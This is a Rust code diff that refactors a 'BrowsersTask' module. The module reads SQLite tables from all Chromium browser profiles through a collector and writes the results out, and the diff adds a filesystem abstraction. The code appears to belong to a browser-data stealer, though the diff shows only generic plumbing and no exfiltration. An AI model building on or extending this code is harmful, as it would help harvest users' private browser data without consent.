@@ -3,7 +3,7 @@
 
 extern crate alloc;
 use database::{DatabaseReader, Databases, TableRecord};
-mod chromium;
+pub mod chromium;
 
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::ChromiumTask;
@@ -13,15 +13,16 @@ use alloc::vec;
 use alloc::vec::Vec;
 use collector::Collector;
 use core::fmt::{Display, Formatter};
+use filesystem::path::Path;
+use filesystem::{FileSystem, WriteTo};
 use tasks::Task;
-use tasks::{CompositeTask, composite_task, impl_composite_task_runner};
-use utils::path::{Path, WriteToFile};
+use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 
-pub struct BrowsersTask<C: Collector> {
-    inner: CompositeTask<C>,
+pub struct BrowsersTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
 }
 
-impl<C: Collector + 'static> Default for BrowsersTask<C> {
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for BrowsersTask<C, F> {
     fn default() -> Self {
         Self {
             inner: composite_task!(ChromiumTask::new()),
@@ -29,33 +30,37 @@ impl<C: Collector + 'static> Default for BrowsersTask<C> {
     }
 }
 
-impl_composite_task_runner!(BrowsersTask<C>, "Browsers");
+impl_composite_task_runner!(BrowsersTask<C, F>, "Browsers");
 
-pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, F, R, T, S>(
+pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, FS, F, R, T, S>(
     profiles: &[Path],
+    filesystem: &FS,
     path: P,
     table: S,
     mapper: F,
 ) -> Option<Vec<T>>
 where
+    FS: FileSystem,
     P: Fn(&Path) -> R,
     R: AsRef<Path>,
     F: Fn(&dyn TableRecord) -> Option<T>,
     T: Ord,
     S: AsRef<str>,
 {
-    collect_and_read_from_all_profiles(profiles, Databases::Sqlite, path, table, mapper)
+    collect_and_read_from_all_profiles(profiles, Databases::Sqlite, filesystem, path, table, mapper)
 }
 
-pub(crate) fn collect_and_read_from_all_profiles<D, P, R, F, T, S>(
+pub(crate) fn collect_and_read_from_all_profiles<D, FS, P, R, F, T, S>(
     profiles: &[Path],
     db_type: D,
+    filesystem: &FS,
     path: P,
     table: S,
     mapper: F,
 ) -> Option<Vec<T>>
 where
     D: AsRef<Databases>,
+    FS: FileSystem,
     P: Fn(&Path) -> R,
     R: AsRef<Path>,
     F: Fn(&dyn TableRecord) -> Option<T>,
@@ -65,10 +70,16 @@ where
     collect_from_all_profiles(profiles, |profile| {
         let db_path = path(profile);
 
-        if !db_path.as_ref().is_exists() {
+        if !filesystem.is_exists(db_path.as_ref()) {
             None
         } else {
-            read_and_map_records(&db_type, db_path.as_ref(), table.as_ref(), &mapper)
+            read_and_map_records(
+                &db_type,
+                filesystem,
+                db_path.as_ref(),
+                table.as_ref(),
+                &mapper,
+            )
         }
     })
 }
@@ -94,28 +105,36 @@ where
     }
 }
 
-pub(crate) fn to_string_and_write_all<T>(data: &[T], sep: &str, dst: &Path) -> Result<(), u32>
+pub(crate) fn to_string_and_write_all<F, T>(
+    data: &[T],
+    sep: &str,
+    filesystem: &F,
+    dst: &Path,
+) -> Result<(), u32>
 where
     T: Display,
+    F: FileSystem,
 {
     data.iter()
         .map(|it| it.to_string())
         .collect::<Vec<String>>()
         .join(sep)
-        .write_to(dst)
+        .write_to(filesystem, dst)
 }
 
-pub(crate) fn read_and_map_records<D, T, F>(
+pub(crate) fn read_and_map_records<FS, D, T, F>(
     db_type: D,
+    filesystem: &FS,
     path: &Path,
     table_name: &str,
     mapper: F,
 ) -> Option<Vec<T>>
 where
+    FS: FileSystem,
     D: AsRef<Databases>,
     F: Fn(&dyn TableRecord) -> Option<T>,
 {
-    let bytes = path.read_file().ok()?;
+    let bytes = filesystem.read_file(path).ok()?;
     let db = db_type.as_ref().read_from_bytes(bytes).ok()?;
     let table = db.read_table(table_name)?;
 
